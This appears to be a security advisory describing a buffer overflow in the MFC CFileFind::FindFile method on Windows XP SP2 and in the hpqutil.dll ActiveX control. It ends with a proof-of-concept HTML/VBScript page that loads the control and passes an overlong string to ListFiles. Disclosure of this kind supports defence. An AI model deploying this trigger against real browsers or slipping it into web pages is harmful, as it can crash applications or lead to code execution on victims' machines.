The CFileFind::FindFile method in the MFC library for Microsoft Windows is prone to a buffer-overflow vulnerability because the method fails to perform adequate boundary checks of user-supplied input.

Successfully exploiting this issue may allow attackers to execute arbitrary code in the context of applications that use the vulnerable method.

The MFC library included with Microsoft Windows XP SP2 is affected; other versions may also be affected.

This issue also occurs in the 'hpqutil.dll' ActiveX control identified by CLSID: F3F381A3-4795-41FF-8190-7AA2A8102F85.

<object classid='clsid:F3F381A3-4795-41FF-8190-7AA2A8102F85' id='pAF'>
</object>
<input type="button" value="heap" language="VBScript" OnClick="OuCh()">
<script language="VBScript">
sub OuCh()
Var_0 = String(620, "A")
pAF.ListFiles Var_0
End Sub
</script>
